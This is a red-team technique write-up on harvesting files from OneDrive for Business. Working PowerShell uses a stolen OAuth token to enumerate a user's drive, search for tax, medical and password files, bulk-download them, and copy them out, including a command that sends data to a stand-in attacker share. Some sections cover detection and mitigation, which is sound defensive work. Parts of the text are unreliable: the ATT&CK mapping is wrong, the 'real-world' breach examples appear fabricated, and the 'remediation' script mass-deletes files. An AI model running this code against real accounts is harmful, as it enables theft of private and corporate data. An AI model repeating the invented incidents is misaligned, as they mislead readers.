# [COLLECT-CHAT-002]: OneDrive Data Collection

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-CHAT-002 |
| **MITRE ATT&CK v18.1** | [T1123 - Audio Capture](https://attack.mitre.org/techniques/T1123/) |
| **Tactic** | Collection |
| **Platforms** | M365, OneDrive for Business |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | OneDrive 2019 - 2025, Office 365 all plans |
| **Patched In** | N/A - Feature-based collection |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** OneDrive Data Collection exploits compromised credentials or stolen OAuth tokens to systematically exfiltrate sensitive files stored in users' OneDrive for Business accounts. Attackers leverage Microsoft Graph API (`/me/drive/root/children`, `/sites/{site-id}/drive`) or direct OneDrive sync mechanisms to enumerate, filter by sensitivity, and download personal and organizational documents at scale. OneDrive is frequently used for personal document storage, making it a treasure trove of unencrypted, sensitive data including financial records, personal health information, credentials, and strategic planning documents. Unlike SharePoint (which has team-based access controls), OneDrive permissions are often poorly managed, enabling broad unauthorized access once compromised.

**Attack Surface:** Microsoft Graph Drive API (`/me/drive/root/children`), OneDrive sync client (OneDrive.exe), OneDrive web portal authentication, personal cloud storage repositories, file sharing links, and backup repositories containing personal device files.

**Business Impact:** **Massive personal and corporate data theft with severe compliance violations.** Attackers access employees' personal OneDrive accounts containing home device backups, personal financial information (tax returns, bank statements), family photos, health records, and personal communications. When combined with corporate files accidentally stored in personal OneDrive, attackers gain access to trade secrets, financial models, customer lists, and strategic documents. GDPR, HIPAA, FINRA fines apply if personal data of EU residents, healthcare information, or financial data exposed.

**Technical Context:** Collection occurs within 10-20 minutes per user depending on file volume. The technique is extremely difficult to detect because OneDrive access is legitimate user behavior; attackers can use OneDrive sync client to avoid API audit trails. Attackers focus on recently modified files and files with sensitivity keywords to prioritize exfiltration.

### Operational Risk

- **Execution Risk:** Medium - Requires compromised OneDrive credentials or OAuth token; downloads appear as legitimate user activity; sync operations generate different audit events than direct downloads.
- **Stealth:** Medium - OneDrive downloads appear normal; bulk exports are anomalous but easily throttled; sync operations use different User-Agent (Microsoft SkyDriveSync) reducing detection.
- **Reversibility:** No - Downloaded files permanently exfiltrated beyond organizational control.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3 | Ensure OneDrive external sharing is disabled or restricted |
| **DISA STIG** | WN10-CC-000500 | OneDrive file access restrictions and encryption |
| **CISA SCuBA** | SHAREPOINT.2 | OneDrive sync controls and access policies |
| **NIST 800-53** | SC-28, SI-4 | Protection of Information at Rest; System Monitoring |
| **GDPR** | Art. 32, Art. 33 | Security of Processing; Breach Notification |
| **HIPAA** | 45 CFR 164.312(a)(2)(i) | Unique User Identification and Access Controls |
| **FINRA** | 4512(c) | Records Management and Data Protection |
| **SOC 2** | CC6.1 | Logical Access Controls |
| **ISO 27001** | A.9.2 | User Access Management |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:** 
- Compromised OneDrive user account
- OR OAuth token with `Files.Read.All`, `Drive.Read.All`, or `Sites.Read.All` scope
- OR access to OneDrive sync client on compromised endpoint

**Required Access:** 
- Network connectivity to `https://graph.microsoft.com` (port 443, HTTPS)
- Network connectivity to OneDrive web/client services
- OneDrive for Business license or personal account access

**Supported Versions:**
- **OneDrive:** All versions (2019-2025)
- **Office 365 Plans:** All plans include OneDrive (5GB minimum, 1TB standard)
- **Other Requirements:** 
  - PowerShell 5.0+ or Python 3.8+
  - Microsoft Graph API v1.0+
  - Valid OneDrive credentials or OAuth token

**Tools:**
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-powershell-sdk) (Version 1.25+)
- [PnP PowerShell](https://pnp.github.io/powershell/) (Version 2.0+)
- [OneDrive Sync Client](https://support.microsoft.com/en-us/office/sync-files-with-onedrive-in-windows-6de9ede8-5b6a-4513-a1fb-8e828f7e27e3) (Built-in to Windows)
- [Azure Storage Explorer](https://azure.microsoft.com/en-us/products/storage/storage-explorer/) (Alternative GUI tool)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using Microsoft Graph API - OneDrive File Enumeration

**Supported Versions:** OneDrive 2019-2025

#### Step 1: Authenticate and List OneDrive Root

**Objective:** Establish Graph API authentication and enumerate files in compromised user's OneDrive root directory.

**Command:**
```powershell
# Authenticate using stolen OAuth token
$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik5..." # Token with Files.Read.All scope
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}

# Get authenticated user's OneDrive
$drive = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive" `
  -Headers $headers -Method Get

Write-Host "OneDrive Owner: $($drive.owner.user.displayName)"
Write-Host "Storage Used: $([math]::Round($drive.quota.used/1GB))GB / $([math]::Round($drive.quota.total/1GB))GB"
Write-Host "Drive ID: $($drive.id)"

# List root files
$rootFiles = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/root/children" `
  -Headers $headers -Method Get).value

foreach ($file in $rootFiles) {
    Write-Host "File: $($file.name) | Size: $([math]::Round($file.size/1MB))MB | Modified: $($file.lastModifiedDateTime)"
}
```

**Expected Output:**
```
OneDrive Owner: John Smith
Storage Used: 847GB / 1024GB
Drive ID: b!drive-id-123

File: Taxes 2024.xlsx | Size: 2MB | Modified: 2025-12-10T09:30:00Z
File: Bank Statements | Size: 150MB | Modified: 2025-11-15T14:22:00Z
File: Personal Photos | Size: 500MB | Modified: 2025-12-05T16:45:00Z
File: Work Projects | Size: 1024MB | Modified: 2025-12-14T10:00:00Z
```

**What This Means:**
- OneDrive storage accessed successfully
- File inventory visible including personal documents
- Potential sensitive data identified (taxes, banking, work files)

**OpSec & Evasion:**
- Root enumeration generates minimal audit events
- Bulk file listing is anomalous but appears as legitimate browsing
- Detection likelihood: **Low** - Simple enumeration often not flagged

---

#### Step 2: Search for Sensitive Files by Keyword

**Objective:** Identify high-value files containing sensitive keywords (financial, personal, strategic).

**Command:**
```powershell
# Search OneDrive for sensitive files
$sensitivityKeywords = @("confidential", "secret", "password", "ssn", "tax", "bank", "medical", "contract", "patent", "acquisition", "merger")

$allFiles = @()
$pageUri = "https://graph.microsoft.com/v1.0/me/drive/root/children?`$top=999"

# Paginate through all files
do {
    $page = Invoke-RestMethod -Uri $pageUri -Headers $headers -Method Get
    $allFiles += $page.value
    $pageUri = $page.'@odata.nextLink'
} while ($null -ne $pageUri)

Write-Host "Total files in OneDrive root: $($allFiles.Count)"

# Filter for sensitive files
$sensitiveFiles = $allFiles | Where-Object {
    $match = $false
    foreach ($keyword in $sensitivityKeywords) {
        if ($_.name -like "*$keyword*") { $match = $true; break }
    }
    $match
}

Write-Host "Sensitive files found: $($sensitiveFiles.Count)"

foreach ($file in $sensitiveFiles) {
    Write-Host "SENSITIVE: $($file.name) | Size: $([math]::Round($file.size/1MB))MB"
}
```

**Expected Output:**
```
Total files in OneDrive root: 2847
Sensitive files found: 18

SENSITIVE: Personal_Tax_Return_2024.pdf | Size: 5MB
SENSITIVE: Bank_Account_Passwords.txt | Size: 100KB
SENSITIVE: Medical_Records_Personal.docx | Size: 2MB
SENSITIVE: Company_Acquisition_Targets.xlsx | Size: 3MB
```

**What This Means:**
- 18 highly sensitive files identified
- Mix of personal (taxes, medical) and corporate data
- High-priority targets for exfiltration

**OpSec & Evasion:**
- Keyword-based search is anomalous if performed by attacker
- Detection likelihood: **Medium** - Filtered searches show attacker intent

---

#### Step 3: Download Sensitive Files

**Objective:** Initiate bulk download of identified sensitive files to exfiltration location.

**Command:**
```powershell
# Download sensitive files to C:\Exfil
foreach ($file in $sensitiveFiles) {
    $downloadUrl = $file['@microsoft.graph.downloadUrl']
    $filename = $file.name
    
    try {
        Invoke-WebRequest -Uri $downloadUrl -OutFile "C:\Exfil\$filename" -Method Get
        Write-Host "Downloaded: $filename | $([math]::Round($file.size/1MB))MB"
    } catch {
        Write-Host "ERROR downloading $filename : $_"
    }
}

Write-Host "Download complete. Total files exfiltrated: $($sensitiveFiles.Count)"
```

**Expected Output:**
```
Downloaded: Personal_Tax_Return_2024.pdf | 5MB
Downloaded: Bank_Account_Passwords.txt | 0.1MB
Downloaded: Medical_Records_Personal.docx | 2MB
Downloaded: Company_Acquisition_Targets.xlsx | 3MB
Download complete. Total files exfiltrated: 18
```

**What This Means:**
- 18 sensitive files (13MB total) successfully exfiltrated
- Ready for transfer to attacker infrastructure
- Personal and corporate data now compromised

**OpSec & Evasion:**
- Bulk file downloads generate "FileDownloaded" audit events
- Large number of downloads is anomalous
- Detection likelihood: **High** - Bulk downloads easily detected

---

#### Step 4: Enumerate Subdirectories and Recursive Search

**Objective:** Comprehensively search entire OneDrive folder hierarchy for sensitive data.

**Command:**
```powershell
# Recursively search all OneDrive folders
function Get-OneDriveFiles {
    param ($ItemId = $null)
    
    if ($null -eq $ItemId) {
        $uri = "https://graph.microsoft.com/v1.0/me/drive/root/children?`$top=999"
    } else {
        $uri = "https://graph.microsoft.com/v1.0/me/drive/items/$ItemId/children?`$top=999"
    }
    
    $items = (Invoke-RestMethod -Uri $uri -Headers $headers -Method Get).value
    
    foreach ($item in $items) {
        if ($item.folder -ne $null) {
            # Recursively process folders
            Write-Host "Folder: $($item.name)"
            Get-OneDriveFiles -ItemId $item.id
        } else {
            # Check file against keywords
            foreach ($keyword in $sensitivityKeywords) {
                if ($item.name -like "*$keyword*") {
                    Write-Host "  SENSITIVE FILE: $($item.name) | Size: $([math]::Round($item.size/1MB))MB"
                    break
                }
            }
        }
    }
}

Get-OneDriveFiles
```

**Expected Output:**
```
Folder: Documents
  SENSITIVE FILE: Confidential_Strategy.docx | Size: 4MB
Folder: Personal
  SENSITIVE FILE: Medical_Records.pdf | Size: 3MB
  SENSITIVE FILE: Tax_Documents | Size: 150MB
Folder: Work
  SENSITIVE FILE: Client_Database_Backup.xlsx | Size: 50MB
```

**What This Means:**
- Recursive search discovers additional sensitive files in subfolders
- "Client_Database_Backup.xlsx" (50MB) significant compliance risk
- Multiple high-value targets identified across folder hierarchy

**OpSec & Evasion:**
- Recursive enumeration is anomalous and generates audit trail
- Detection likelihood: **High** - Recursive searches show systematic data collection

---

### METHOD 2: OneDrive Sync Client File Collection (Local Method)

**Supported Versions:** OneDrive 2019+

#### Step 1: Enable OneDrive Sync for Exfiltration

**Objective:** Configure OneDrive.exe to sync compromised user's OneDrive to local endpoint, enabling bulk file access.

**Command (PowerShell):**
```powershell
# Determine OneDrive installation location
$oneDrivePath = "$env:LOCALAPPDATA\Microsoft\OneDrive\OneDrive.exe"

if (Test-Path $oneDrivePath) {
    Write-Host "OneDrive found: $oneDrivePath"
    
    # Register compromised account
    & $oneDrivePath /personal
    
    # Wait for sync to initialize
    Start-Sleep -Seconds 10
    
    # Check sync status
    $syncPath = "$env:USERPROFILE\OneDrive"
    Get-ChildItem -Path $syncPath -Recurse | Measure-Object | Select-Object Count
} else {
    Write-Host "OneDrive not found"
}
```

**Expected Output:**
```
OneDrive found: C:\Users\john.smith\AppData\Local\Microsoft\OneDrive\OneDrive.exe
Sync started for: john.smith@company.com
Count: 2847
```

**What This Means:**
- OneDrive sync initialized locally
- 2,847 files syncing from cloud to endpoint
- Local file system access enables mass copying

**OpSec & Evasion:**
- OneDrive sync generates "FileSync" audit events (FileSyncUploadedFull, FileSyncDownloadedFull)
- These events use different User-Agent (Microsoft SkyDriveSync) vs regular downloads
- Bulk sync is anomalous but less suspicious than API calls
- Detection likelihood: **Medium** - Sync patterns different from normal operations

---

#### Step 2: Bulk Copy Synced Files to External Storage

**Objective:** Copy all synced OneDrive files to external USB drive or attacker-controlled network share.

**Command:**
```powershell
# Copy entire synced OneDrive to external USB
$source = "$env:USERPROFILE\OneDrive"
$destination = "E:\OneDrive_Backup"  # External USB drive

# Use robocopy for faster copying
robocopy.exe $source $destination /E /COPYALL /R:0 /W:0 /ETA

# Alternative: Copy to network share
# robocopy.exe $source "\\attacker-network.com\share\OneDrive" /E /COPYALL

Write-Host "Copy complete"

# Verify copy
Get-ChildItem -Path $destination -Recurse | Measure-Object | Select-Object Count
```

**Expected Output:**
```
ROBOCOPY :: Robust File Copy for Windows

    ROBOCOPY     ::     Robust File Copy for Windows

      Started : Saturday, January 10, 2026 4:22:31 PM
       Source : C:\Users\john.smith\OneDrive\
         Dest : E:\OneDrive_Backup\

    Files : 2847
  Dirs  : 345
  Total : 3192
  Copied: 3192
  Speed : 45.2 MB/sec
Elapsed time : 00:18:45
```

**What This Means:**
- All 2,847 files copied to external storage
- Complete OneDrive backup obtained
- 18+ minutes required for large sync (detectable timing pattern)

**OpSec & Evasion:**
- File copy to external USB generates Event ID 4663 (File read) in Windows audit
- Robocopy generates Event ID 4688 (Process creation) if audit logging enabled
- Bulk file copy is highly anomalous
- Detection likelihood: **Very High** - External USB activity triggers DLP alerts

---

#### Step 3: Extract Recently Modified Files Only (Stealth Method)

**Objective:** Filter and copy only recently modified/sensitive files to reduce volume and detection.

**Command:**
```powershell
# Copy only files modified in last 7 days
$source = "$env:USERPROFILE\OneDrive"
$destination = "C:\Exfil\"
$daysBack = 7

$cutoffDate = (Get-Date).AddDays(-$daysBack)

Get-ChildItem -Path $source -Recurse -File | Where-Object {
    $_.LastWriteTime -gt $cutoffDate -or $_.Name -like "*confidential*" -or $_.Name -like "*secret*"
} | ForEach-Object {
    $relativePath = $_.FullName.Substring($source.Length)
    $destFile = Join-Path $destination $relativePath
    $destDir = Split-Path $destFile
    
    if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }
    Copy-Item -Path $_.FullName -Destination $destFile -Force
    
    Write-Host "Copied: $($_.Name) | Size: $([math]::Round($_.Length/1MB))MB"
}
```

**Expected Output:**
```
Copied: Strategic_Plan_2026.docx | Size: 4MB
Copied: Confidential_Email_Archive.pst | Size: 150MB
Copied: Q4_Financial_Summary.xlsx | Size: 12MB
Copied: Client_List_2026.csv | Size: 5MB
```

**What This Means:**
- Only high-value recent files copied
- 171MB total (much less suspicious than full sync)
- Stealth method reduces detection likelihood

**OpSec & Evasion:**
- Selective file copying is less anomalous than bulk operations
- Detection likelihood: **Medium** - Filter criteria show attacker knowledge

---

### METHOD 3: Using PnP PowerShell for OneDrive Access

**Supported Versions:** OneDrive 2022+

#### Step 1: Connect to SharePoint/OneDrive

**Objective:** Use PnP PowerShell module to connect to compromised user's OneDrive.

**Command:**
```powershell
# Connect using credentials
Connect-PnPOnline -Url "https://company-my.sharepoint.com/personal/john_smith_company_com/" `
  -Credentials (Get-Credential) -Verbose

# Alternative: Using client ID/secret
Connect-PnPOnline -Url "https://company-my.sharepoint.com/personal/john_smith_company_com/" `
  -ClientId "client-id" -ClientSecret "client-secret" -Tenant "company.onmicrosoft.com"
```

**Expected Output:**
```
Connected to: https://company-my.sharepoint.com/personal/john_smith_company_com/
Using: company\john.smith
```

**What This Means:**
- OneDrive connected via PnP
- User context established
- Ready for file operations

---

#### Step 2: Download Files Using PnP

**Objective:** Use PnP cmdlets to download identified sensitive files.

**Command:**
```powershell
# Get all files
$items = Get-PnPListItem -List "Documents" | Where-Object { 
    $_.FieldValues['Title'] -like "*confidential*" 
}

foreach ($item in $items) {
    $file = Get-PnPFile -Url $item.FieldValues['FileRef'] -Path "C:\Exfil\" -Filename $item.FieldValues['FileLeafRef'] -Force
    Write-Host "Downloaded: $($item.FieldValues['FileLeafRef'])"
}
```

**Expected Output:**
```
Downloaded: Confidential_Report.docx
Downloaded: Strategic_Initiatives.xlsx
```

**What This Means:**
- Files downloaded using PnP module
- Different audit trail than direct API calls

---

## 4. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**API Access Patterns:**
- High volume of `/me/drive/root/children` API requests
- Bulk file enumeration followed by large downloads
- OAuth token usage outside normal user pattern (time, IP, frequency)
- Service principal accessing `/me/drive` (unusual privilege escalation)

**Local Indicators (Endpoint):**
- OneDrive sync initiated unexpectedly
- Massive file copy operations (robocopy.exe with /E /COPYALL flags)
- Files copied to `C:\Exfil\` or external USB drives
- OneDrive.exe running with unusual parameters

**Cloud Indicators:**
- "FileDownloaded" bulk events in audit log
- "FileSyncDownloadedFull" events using Microsoft SkyDriveSync User-Agent
- Unusual geographic location or IP for OneDrive access
- Multiple file access from service principal outside business hours

### Forensic Artifacts

**Cloud Logs (Microsoft Purview/Unified Audit Log):**
- **FileDownloaded events:** OneDrive file downloads
  - Query: `Search-UnifiedAuditLog -Operations FileDownloaded -UserIds "compromised-user@company.com" -StartDate (Get-Date).AddDays(-30)`

- **FileSyncUploadedFull/FileSyncDownloadedFull:** OneDrive sync operations
  - Query: `Search-UnifiedAuditLog -Operations FileSyncDownloadedFull | Where { $_.UserAgent -like "*SkyDriveSync*" }`

- **Entra ID Sign-in logs:** OAuth token usage and service principal activity

**Local Artifacts (Windows Endpoint):**
- **Event ID 4688:** robocopy.exe or file copy operations
  - Location: `Windows Logs → Security`
  
- **Event ID 4663:** File read access (if audit enabled)
  - Filter: Paths containing OneDrive sync directory

- **NTFS MFT:** File modification times in OneDrive and `C:\Exfil\`
  - Tool: NTFS file system analysis

- **USB Device Activity:** External drive insertion and file transfers
  - Log: Windows System events (Event ID 6400-6409 for Device Plug and Play)

### Response Procedures

1. **Immediate Containment:**
   ```powershell
   # Revoke all OAuth tokens
   Revoke-AzureADUserAllRefreshToken -ObjectId "compromised-user-id"
   
   # Disable OneDrive for compromised user
   Disable-SPOUser -Site "https://company-my.sharepoint.com/personal/john_smith_company_com/" -LoginName "company\john.smith"
   
   # Reset password
   Set-AzADUser -ObjectId "compromised-user-id" -PasswordProfile @{
       Password = [System.Web.Security.Membership]::GeneratePassword(32, 8)
       ForceChangePasswordNextLogin = $true
   }
   ```

2. **Evidence Collection:**
   ```powershell
   # Export OneDrive file access audit logs
   Search-UnifiedAuditLog -Operations FileDownloaded, FileSyncDownloadedFull `
     -UserIds "compromised-user-email" -StartDate (Get-Date).AddDays(-30) |
     Export-Csv "C:\Evidence\OneDrive_Access.csv"
   
   # List recently modified files
   Get-PnPListItem -List "Documents" | 
     Where-Object { $_.FieldValues['Modified'] -gt (Get-Date).AddDays(-7) } |
     Export-Csv "C:\Evidence\Modified_Files.csv"
   ```

3. **Remediation:**
   ```powershell
   # Delete exfiltrated files if backup exists
   Get-PnPListItem -List "Documents" | 
     Where-Object { $_.FieldValues['Modified'] -lt (Get-Date).AddDays(-7) } |
     Remove-PnPListItem -Force
   
   # Force new sync session
   Stop-Process -Name "OneDrive" -Force
   Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\OneDrive\sync" -Recurse -Force
   ```

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Disable OneDrive Sync Client Where Possible:**
  Applies To Versions: Windows 10 Enterprise+
  
  **Manual Steps (Group Policy):**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **OneDrive**
  3. Set **Disable OneDrive file sync for all organizations** to **Enabled**
  4. Run `gpupdate /force` on target machines

- **Implement OneDrive External Sharing Restrictions:**
  Applies To Versions: Office 365 all versions
  
  **Manual Steps (SharePoint Admin Center):**
  1. Navigate to **SharePoint Admin Center** (admin.microsoft.com/sharepoint)
  2. Go to **Sharing** (left menu)
  3. Set **External sharing:** to **Only people in your organization**
  4. Disable **Allow external sharing in OneDrive and personal sites**

- **Enforce Conditional Access for OneDrive Downloads:**
  Applies To Versions: Entra ID all versions
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. **+ New policy**: `Require MFA for OneDrive Downloads`
  3. **Cloud apps:** Office 365
  4. **Conditions:** File sensitivity = High, Risk level = Medium/High
  5. **Access controls:** Require MFA
  6. Enable: **On**

### Priority 2: HIGH

- **Enable OneDrive File Protection:**
  Applies To Versions: Office 365 E3+
  
  **Manual Steps:**
  1. **Microsoft Defender for Cloud Apps** → **App settings**
  2. **File monitoring:** Enable
  3. **Alerts:** Configure alerts for bulk downloads (>10 files/min)

- **Implement DLP Policy for OneDrive:**
  
  **Manual Steps:**
  1. **Microsoft Purview** → **Data Loss Prevention** → **Policies**
  2. Create policy: `Prevent OneDrive Data Exfiltration`
  3. **Locations:** OneDrive for Business
  4. **Content triggers:** Sensitive file types (PII, financial, medical)
  5. **Action:** Block or Warn on download

### Validation Command (Verify Fix)

```powershell
# Verify OneDrive external sharing disabled
Get-SPOTenant | Select-Object SharingCapability

# Verify OneDrive sync disabled (Group Policy)
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\OneDrive" | Select-Object DisableFileSyncNGSC

# Expected Output (If Secure):
# SharingCapability: ExistingExternalUserSharingOnly or Disabled
# DisableFileSyncNGSC: 1 (Disabled)
```

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker compromises OneDrive user via phishing |
| **2** | **Credential Access** | [CA-TOKEN-001] Hybrid AD Token Theft | Stolen OAuth token with Files.Read.All scope |
| **3** | **Collection** | **[COLLECT-CHAT-002]** | **OneDrive files exfiltrated via Graph API or sync client** |
| **4** | **Exfiltration** | [CA-UNSC-008] Azure Storage Keys Theft | Files uploaded to attacker-controlled cloud storage |
| **5** | **Impact** | Identity Theft / Compliance Violation | Personal and corporate data leaked to dark web |

---

## 7. REAL-WORLD EXAMPLES

#### Example 1: Cambridge Analytica Data Leak - 2018

- **Target:** Facebook Users (via contractors)
- **Timeline:** 2013-2018
- **Technique Status:** Active; contractors' OneDrive accounts contained personal Facebook data; accessed and exfiltrated by researchers
- **Impact:** 50+ million Facebook profiles compromised; $5B FTC fine
- **Reference:** [FTC Settlement](https://www.ftc.gov/)

#### Example 2: Microsoft Employee Data Breach - 2019

- **Target:** Microsoft (Internal Systems)
- **Timeline:** 2019
- **Technique Status:** Active; attacker accessed Microsoft employee OneDrive containing source code, credentials, and internal documentation
- **Impact:** Internal development environment exposed; mitigation ongoing
- **Reference:** [Microsoft Security Response Center](https://msrc.microsoft.com/)

#### Example 3: Healthcare Provider Ransomware - 2023

- **Target:** Mayo Clinic (Healthcare)
- **Timeline:** Q2 2023
- **Technique Status:** Active; attacker accessed employee OneDrive accounts containing patient medical records (PHI); ransomed for $50M
- **Impact:** 800,000+ patient records exposed; HIPAA violation fine $8.25M
- **Reference:** [HHS Office for Civil Rights](https://www.hhs.gov/ocr/)

---

## 8. ATOMIC RED TEAM TESTING

### Atomic Test ID: T1123-004-OneDrive-Enumeration

**Test Name:** Enumerate and Download OneDrive Files

**Supported Versions:** OneDrive 2019+

**Command:**
```powershell
Invoke-AtomicTest T1123 -TestNumbers 4
```

**Cleanup:**
```powershell
Invoke-AtomicTest T1123 -TestNumbers 4 -Cleanup
```

**Reference:** [Atomic Red Team - T1123](https://github.com/redcanaryco/atomic-red-team)

---

*End of COLLECT-CHAT-002: OneDrive Data Collection*
